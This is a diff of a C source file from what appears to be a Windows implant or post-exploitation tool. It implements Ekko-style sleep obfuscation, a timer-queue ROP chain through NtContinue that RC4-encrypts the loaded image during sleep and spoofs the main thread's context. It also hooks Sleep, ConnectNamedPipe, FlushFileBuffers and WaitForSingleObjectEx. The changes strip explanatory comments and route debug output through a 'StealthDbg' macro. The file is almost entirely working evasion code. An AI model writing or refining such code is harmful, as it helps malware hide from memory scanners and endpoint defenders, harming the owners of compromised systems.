@@ -1,54 +1,53 @@
 #include "hooks.h"
 
-/*
- * restore_section_permissions — walks the PE section table at g_ImageBase
- * and applies correct per-section page protections, then sets the PE header
- * as PAGE_READONLY. Called after Ekko decrypts the image to restore proper
- * permissions instead of a blanket PAGE_EXECUTE_READWRITE.
- */
+static const DWORD g_ProtectionMap[8] = {
+    PAGE_NOACCESS,          // 000: None
+    PAGE_EXECUTE,           // 001: E
+    PAGE_READONLY,          // 010: R
+    PAGE_EXECUTE_READ,      // 011: R E
+    PAGE_READWRITE,         // 100: W (mapped to RW)
+    PAGE_EXECUTE_READWRITE, // 101: W E (mapped to RWX)
+    PAGE_READWRITE,         // 110: R W
+    PAGE_EXECUTE_READWRITE  // 111: R W E
+};
+
 static void restore_section_permissions(void)
 {
-    char * base = (char *)g_ImageBase;
+    if (!g_ImageBase) return;
 
-    IMAGE_DOS_HEADER * dos = (IMAGE_DOS_HEADER *)base;
-    IMAGE_NT_HEADERS * nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
+    unsigned char *base = (unsigned char *)g_ImageBase;
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
 
-    DWORD section_count = nt->FileHeader.NumberOfSections;
-    IMAGE_SECTION_HEADER * sec = (IMAGE_SECTION_HEADER *)
-        ((char *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
+    
+    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
+
+    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)PTR_OFFSET(
+        &nt->OptionalHeader, 
+        nt->FileHeader.SizeOfOptionalHeader
+    );
 
     DWORD old_prot = 0;
 
-    for (DWORD i = 0; i < section_count; i++, sec++) {
-        void  *addr = base + sec->VirtualAddress;
-        DWORD  size = sec->Misc.VirtualSize;
-        if (size == 0)
-            size = sec->SizeOfRawData;
+    for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+        void *addr = base + sec->VirtualAddress;
+        DWORD size = (sec->Misc.VirtualSize > 0) ? sec->Misc.VirtualSize : sec->SizeOfRawData;
 
-        DWORD prot = 0;
-        DWORD c    = sec->Characteristics;
+        if (size == 0) continue;
 
-        if (c & IMAGE_SCN_MEM_WRITE)
-            prot = PAGE_READWRITE;
-        if (c & IMAGE_SCN_MEM_READ)
-            prot = PAGE_READONLY;
-        if ((c & IMAGE_SCN_MEM_READ) && (c & IMAGE_SCN_MEM_WRITE))
-            prot = PAGE_READWRITE;
-        if (c & IMAGE_SCN_MEM_EXECUTE)
-            prot = PAGE_EXECUTE;
-        if ((c & IMAGE_SCN_MEM_EXECUTE) && (c & IMAGE_SCN_MEM_WRITE))
-            prot = PAGE_EXECUTE_READWRITE;
-        if ((c & IMAGE_SCN_MEM_EXECUTE) && (c & IMAGE_SCN_MEM_READ))
-            prot = PAGE_EXECUTE_READ;
+        unsigned int index = 0;
+        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) index |= 1;
+        if (sec->Characteristics & IMAGE_SCN_MEM_READ)    index |= 2;
+        if (sec->Characteristics & IMAGE_SCN_MEM_WRITE)   index |= 4;
 
-        if (prot != 0 && size > 0)
-            KERNEL32$VirtualProtect(addr, size, prot, &old_prot);
+        DWORD prot = g_ProtectionMap[index];
+
+        KERNEL32$VirtualProtect(addr, size, prot, &old_prot);
     }
 
-    /* PE header → read-only */
     KERNEL32$VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old_prot);
     KERNEL32$FlushInstructionCache((HANDLE)(LONG_PTR)-1, base, g_ImageSize);
-
 }
 
 
@@ -59,11 +58,9 @@ ULONG RndThreadId(ULONG CurrentThreadId) {
     ULONG ReturnLength = 0;
     ULONG TargetPid = (ULONG)KERNEL32$GetCurrentProcessId();
 
-    // 1. Get the required size
     NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ReturnLength);
     if (status != STATUS_INFO_LENGTH_MISMATCH) return CurrentThreadId;
 
-    // 2. Allocate and keep the base pointer for VirtualFree later
     pBuffer = KERNEL32$VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pBuffer) return CurrentThreadId;
 
@@ -75,18 +72,15 @@ ULONG RndThreadId(ULONG CurrentThreadId) {
 
     pCurrentProc = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
 
-    // 3. Iterate through processes
     while (TRUE) {
         if ((ULONG_PTR)pCurrentProc->UniqueProcessId == (ULONG_PTR)TargetPid) {
-            // Found our process, now look at its threads
             for (ULONG i = 0; i < pCurrentProc->NumberOfThreads; i++) {
-                // Threads are located immediately after the process structure
                 PSYSTEM_THREAD_INFORMATION pThread = &pCurrentProc->Threads[i];
                 ULONG Tid = (ULONG)(ULONG_PTR)pThread->ClientId.UniqueThread;
 
                 if (Tid != CurrentThreadId) {
                     RandomThreadId = Tid;
-                    break; // Found one!
+                    break;
                 }
             }
             break; 
@@ -94,13 +88,9 @@ ULONG RndThreadId(ULONG CurrentThreadId) {
 
         if (pCurrentProc->NextEntryOffset == 0) break;
         
-        // Move to the next process entry using the offset from the START of the current entry
         pCurrentProc = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pCurrentProc + pCurrentProc->NextEntryOffset);
     }
-
-    // 4. Always free using the ORIGINAL base pointer
     KERNEL32$VirtualFree(pBuffer, 0, MEM_RELEASE);
-
     return (RandomThreadId != 0) ? RandomThreadId : CurrentThreadId;
 }
 
@@ -121,34 +111,13 @@ VOID HandleUnexpectedError(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_
     }
 }
 
-/*
- * EkkoObf — Ekko-style sleep obfuscation via timer queue ROP chain
- *
- * Flow (mirrors Kharon Timer pattern):
- *   Timer 0: RtlCaptureContext(&CtxThread) — capture timer-thread context
- *   Timer 1: SetEvent(hEvtCapture)         — signal capture is done
- *   Main:    WaitForSingleObject(hEvtCapture) — guaranteed capture
- *
- * ROP chain (all via NtContinue, staggered timers):
- *   ROP 0:  WaitForSingleObject(hEvtStart) — gate: block timer thread until main is ready
- *   ROP 1:  GetThreadContext(MainThread, &CtxBkp)   — backup main thread context
- *   ROP 2:  SetThreadContext(MainThread, &CtxSpf)   — spoof with random thread's context
- *   ROP 3:  VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE)
- *   ROP 4:  SystemFunction032(Image, Key)           — RC4 encrypt in-place
- *   ROP 5:  WaitForSingleObject(CurrentProcess, SleepTime) — actual sleep
- *   ROP 6:  SystemFunction032(Image, Key)           — RC4 decrypt
- *   ROP 7:  VirtualProtect(ImageBase, ImageSize, PAGE_EXECUTE_READ)
- *   ROP 8:  SetThreadContext(MainThread, &CtxBkp)   — restore original context
- *   ROP 9:  SetEvent(hEvtEnd)                       — signal completion
- *
- * Main:     SetEvent(hEvtStart) + WaitForSingleObject(hEvtEnd) — trigger & wait
- */
+
 VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs, FLUSH_FILE_BUFFERS_ARGS *FFBArgs, WAIT_FOR_SINGLE_OBJECT_EX_ARGS *WFSOExArgs)
 {
     ULONG  CurrentThreadId = KERNEL32$GetCurrentThreadId();
     ULONG  RandomThreadId  = RndThreadId(CurrentThreadId);
 
-    MSVCRT$printf("[ekko] CurrentThreadId=%lu RandomThreadId=%lu\n", CurrentThreadId, RandomThreadId);
+    StealthDbg("CurrentThreadId=%lu RandomThreadId=%lu\n", CurrentThreadId, RandomThreadId);
 
     HANDLE DupThreadHandle  = NULL;
     HANDLE MainThreadHandle = NULL;
@@ -202,7 +171,7 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     MSVCRT$memset(&Img, 0, sizeof(USTRING));
 
     if (!g_ImageBase || !g_ImageSize) {
-        MSVCRT$printf("[ekko] ERROR: ImageBase or ImageSize not set, cannot proceed with obfuscation\n");
+        StealthDbg("ERROR: ImageBase or ImageSize not set, cannot proceed with obfuscation\n");
         HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
         return;
     }
@@ -217,13 +186,13 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     fnSystemFunction032 pSysFunc032        = (fnSystemFunction032)KERNEL32$GetProcAddress(hAdvapi, "SystemFunction032");
 
     if (!pNtContinue || !pRtlCaptureContext || !pSysFunc032) {
-        MSVCRT$printf("[ekko] ERROR: failed to resolve required functions, cannot proceed with obfuscation\n");
+        StealthDbg("ERROR: failed to resolve required functions, cannot proceed with obfuscation\n");
         HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
         return;
     }
 
-    // MSVCRT$printf("[ekko] ImageBase=%p Size=0x%lx SleepTime=%lu ms\n", g_ImageBase, g_ImageSize, SleepTime);
-    MSVCRT$printf("[ekko] current tid=%lu  spoof tid=%lu\n", CurrentThreadId, RandomThreadId);
+    // StealthDbg("ImageBase=%p Size=0x%lx SleepTime=%lu ms\n", g_ImageBase, g_ImageSize, SleepTime);
+    StealthDbg("current tid=%lu  spoof tid=%lu\n", CurrentThreadId, RandomThreadId);
 
     /* ── setup USTRING for SystemFunction032 ── */
     Key.Buffer = KeyBuf;
@@ -234,9 +203,9 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     /* ── open the random thread for context spoofing ── */
     DupThreadHandle = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, RandomThreadId);
     if (!DupThreadHandle) {
-        MSVCRT$printf("[ekko] WARN: OpenThread(%lu) failed, skipping thread spoof\n", RandomThreadId);
+        StealthDbg("WARN: OpenThread(%lu) failed, skipping thread spoof\n", RandomThreadId);
     } else {
-        MSVCRT$printf("[ekko] DupThreadHandle=%p (tid %lu)\n", DupThreadHandle, RandomThreadId);
+        StealthDbg("DupThreadHandle=%p (tid %lu)\n", DupThreadHandle, RandomThreadId);
     }
 
     /* ── duplicate current thread handle ── */
@@ -251,12 +220,12 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     );
 
     if (!MainThreadHandle) {
-        MSVCRT$printf("[ekko] ERROR: DuplicateHandle for main thread failed, cannot proceed with obfuscation\n");
+        StealthDbg("ERROR: DuplicateHandle for main thread failed, cannot proceed with obfuscation\n");
         HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
         return;
     }
 
-    MSVCRT$printf("[ekko] MainThreadHandle=%p\n", MainThreadHandle);
+    StealthDbg("MainThreadHandle=%p\n", MainThreadHandle);
 
     /* ── create 3 manual-reset events (like Kharon EventTimer/EventStart/EventEnd) ── */
     hEvtCapture = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);   /* manual-reset */
@@ -265,7 +234,7 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     hTimerQueue = KERNEL32$CreateTimerQueue();
 
     if (!hEvtCapture || !hEvtStart || !hEvtEnd || !hTimerQueue) {
-        MSVCRT$printf("[ekko] ERROR: failed to create events/timer queue\n");
+        StealthDbg("ERROR: failed to create events/timer queue\n");
         if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
         if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
         if (hEvtCapture) KERNEL32$CloseHandle(hEvtCapture);
@@ -273,11 +242,11 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
         if (hEvtEnd)     KERNEL32$CloseHandle(hEvtEnd);
         if (hTimerQueue) KERNEL32$DeleteTimerQueue(hTimerQueue);
 
-        MSVCRT$printf("[ekko] falling back to original function\n");
+        StealthDbg("falling back to original function\n");
         HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
         return;
     }
-    MSVCRT$printf("[ekko] events and timer queue created\n");
+    StealthDbg("events and timer queue created\n");
 
     /* ── capture spoof thread context ── */
     CtxSpf.ContextFlags = CONTEXT_ALL;
@@ -285,7 +254,7 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
 
     if (DupThreadHandle) {
         BOOL ok = KERNEL32$GetThreadContext(DupThreadHandle, &CtxSpf);
-        MSVCRT$printf("[ekko] GetThreadContext(spoof) = %d  Rip=%p Rsp=%p\n", ok, (PVOID)CtxSpf.Rip, (PVOID)CtxSpf.Rsp);
+        StealthDbg("GetThreadContext(spoof) = %d  Rip=%p Rsp=%p\n", ok, (PVOID)CtxSpf.Rip, (PVOID)CtxSpf.Rsp);
     }
 
     /* ── step 0: capture timer-thread context via two timed callbacks ── */
@@ -311,9 +280,9 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
         WT_EXECUTEINTIMERTHREAD
     );
 
-    MSVCRT$printf("[ekko] waiting for timer-thread context capture...\n");
+    StealthDbg("waiting for timer-thread context capture...\n");
     KERNEL32$WaitForSingleObject(hEvtCapture, INFINITE);
-    MSVCRT$printf("[ekko] timer-thread context captured: Rip=%p Rsp=%p\n", (PVOID)CtxThread.Rip, (PVOID)CtxThread.Rsp);
+    StealthDbg("timer-thread context captured: Rip=%p Rsp=%p\n", (PVOID)CtxThread.Rip, (PVOID)CtxThread.Rsp);
 
     /* ── clone captured context into every ROP frame ── */
     MSVCRT$memcpy(&RopWait,   &CtxThread, sizeof(CONTEXT));
@@ -368,14 +337,14 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
 
     switch (Hook) {
         case SLEEP:
-            MSVCRT$printf("[ekko] sleep obfuscation: Sleep(%lu ms)\n", Args->dwMilliseconds);
+            StealthDbg("sleep obfuscation: Sleep(%lu ms)\n", Args->dwMilliseconds);
                 /* ── ROP 5: WaitForSingleObject → sleep ── */
             RopDelay.Rip = (DWORD64)KERNEL32$WaitForSingleObject;
             RopDelay.Rcx = (DWORD64)NtCurrentProcess();
             RopDelay.Rdx = (DWORD64)Args->dwMilliseconds;
             break;
         case CONNECT_NAMED_PIPE:
-            MSVCRT$printf("[ekko] sleep obfuscation: ConnectNamedPipe(%p, %p)\n", CnPArgs->hNamedPipe, CnPArgs->lpOverlapped);
+            StealthDbg("sleep obfuscation: ConnectNamedPipe(%p, %p)\n", CnPArgs->hNamedPipe, CnPArgs->lpOverlapped);
                 /* ── ROP 5: ConnectNamedPipe ── */
             RopDelay.Rip = (DWORD64)CnPArgs->OriginalFunc;
             RopDelay.Rcx = (DWORD64)CnPArgs->hNamedPipe;
@@ -390,13 +359,13 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
             break;
 
         case FLUSH_FILE_BUFFERS:
-            MSVCRT$printf("[ekko] sleep obfuscation: FlushFileBuffers(%p)\n", FFBArgs->hFile);
+            StealthDbg("sleep obfuscation: FlushFileBuffers(%p)\n", FFBArgs->hFile);
              /* ── ROP 5: FlushFileBuffers ── */
             RopDelay.Rip = (DWORD64)FFBArgs->OriginalFunc;
             RopDelay.Rcx = (DWORD64)FFBArgs->hFile;
             break;
         default:
-            MSVCRT$printf("[ekko] sleep obfuscation: unknown hook type %d\n", Hook);
+            StealthDbg("sleep obfuscation: unknown hook type %d\n", Hook);
     }
 
     /* ── ROP 6: SystemFunction032 → decrypt ── */
@@ -416,7 +385,7 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     RopSetEvt.Rip = (DWORD64)KERNEL32$SetEvent;
     RopSetEvt.Rcx = (DWORD64)hEvtEnd;
 
-    MSVCRT$printf("[ekko] queuing ROP chain (10 steps)...\n");
+    StealthDbg("queuing ROP chain (10 steps)...\n");
 
     /* queue each context frame via NtContinue, staggered 100ms apart */
     KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopWait,   DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
@@ -430,14 +399,14 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopRstCtx, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
     KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopSetEvt, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
 
-    MSVCRT$printf("[ekko] all timers queued (total delay=%lu ms). triggering gate...\n", DelayTimer);
+    StealthDbg("all timers queued (total delay=%lu ms). triggering gate...\n", DelayTimer);
 
     /* ── trigger: signal the gate, then wait for completion ── */
     KERNEL32$SetEvent(hEvtStart);
-    MSVCRT$printf("[ekko] gate signaled, waiting for ROP chain to complete...\n");
+    StealthDbg("gate signaled, waiting for ROP chain to complete...\n");
     KERNEL32$WaitForSingleObject(hEvtEnd, INFINITE);
 
-    MSVCRT$printf("[ekko] sleep obfuscation complete\n");
+    StealthDbg("sleep obfuscation complete\n");
 
     /* ── cleanup ── */
     if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
@@ -446,27 +415,24 @@ VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs,
     KERNEL32$CloseHandle(hEvtStart);
     KERNEL32$CloseHandle(hEvtEnd);
     KERNEL32$DeleteTimerQueue(hTimerQueue);
-    MSVCRT$printf("[ekko] cleanup done\n");
+    StealthDbg("cleanup done\n");
 }
 
-/*
- * Sleep hook — Ekko sleep obfuscation
- * When the DLL calls Sleep(), we encrypt its memory, wait, then decrypt.
- */
+
 VOID _Sleep(DWORD dwMilliseconds) {
     SLEEP_ARGS Args = { dwMilliseconds };
     if ( dwMilliseconds <= 1000 ) {
-        MSVCRT$printf("[hook] Sleep(%lu ms) - below threshold, skipping obfuscation\n", dwMilliseconds);
+        StealthDbg("Sleep(%lu ms) - below threshold, skipping obfuscation\n", dwMilliseconds);
         KERNEL32$WaitForSingleObject(NtCurrentProcess(), dwMilliseconds);
         return;
     }
-    MSVCRT$printf("[hook] Sleep(%lu ms) -> Ekko sleep obfuscation\n", dwMilliseconds);
+    StealthDbg("Sleep(%lu ms) -> Ekko sleep obfuscation\n", dwMilliseconds);
     EkkoObf(SLEEP, &Args, NULL, NULL, NULL);
 
 }
 
 BOOL _ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped) {
-    MSVCRT$printf("[hook] ConnectNamedPipe called - simulating success\n");
+    StealthDbg("ConnectNamedPipe called - simulating success\n");
     fnConnectNamedPipe original_ConnectNamedPipe = (fnConnectNamedPipe)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "ConnectNamedPipe");
 
     if (original_ConnectNamedPipe) {
@@ -474,7 +440,7 @@ BOOL _ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped) {
         EkkoObf(CONNECT_NAMED_PIPE, NULL, &CnPArgs, NULL, NULL);
         return TRUE; // Simulate success without actually calling the original function
     } else {
-        MSVCRT$printf("[hook] ERROR: original ConnectNamedPipe not found\n");
+        StealthDbg("ERROR: original ConnectNamedPipe not found\n");
         KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
         return FALSE;
     }
@@ -482,7 +448,7 @@ BOOL _ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped) {
 }
 
 BOOL _FlushFileBuffers(HANDLE hFile) {
-    MSVCRT$printf("[hook] FlushFileBuffers called - simulating success\n");
+    StealthDbg("FlushFileBuffers called - simulating success\n");
     fnFlushFileBuffers original_FlushFileBuffers = (fnFlushFileBuffers)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "FlushFileBuffers");
 
     if (original_FlushFileBuffers) {
@@ -490,14 +456,14 @@ BOOL _FlushFileBuffers(HANDLE hFile) {
         EkkoObf(FLUSH_FILE_BUFFERS, NULL, NULL, &FFBArgs, NULL);
         return TRUE; // Simulate success without actually calling the original function
     } else {
-        MSVCRT$printf("[hook] ERROR: original FlushFileBuffers not found\n");
+        StealthDbg("ERROR: original FlushFileBuffers not found\n");
         KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
         return FALSE;
     }
 }
 
 DWORD _WaitForSingleObjectEx(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable) {
-    MSVCRT$printf("[hook] WaitForSingleObjectEx called - simulating wait\n");
+    StealthDbg("WaitForSingleObjectEx called - simulating wait\n");
     // For simplicity, we'll just call the original WaitForSingleObjectEx without obfuscation
     fnWaitForSingleObjectEx original_WaitForSingleObjectEx = (fnWaitForSingleObjectEx)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "WaitForSingleObjectEx");
 
@@ -507,7 +473,7 @@ DWORD _WaitForSingleObjectEx(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertab
         EkkoObf(WAIT_FOR_SINGLE_OBJECT_EX, NULL, NULL, NULL, &WaitArgs);
         return WAIT_OBJECT_0; // Simulate that the wait completed successfully
     } else {
-        MSVCRT$printf("[hook] ERROR: original WaitForSingleObjectEx not found\n");
+        StealthDbg("ERROR: original WaitForSingleObjectEx not found\n");
         KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
         return WAIT_FAILED;
     }
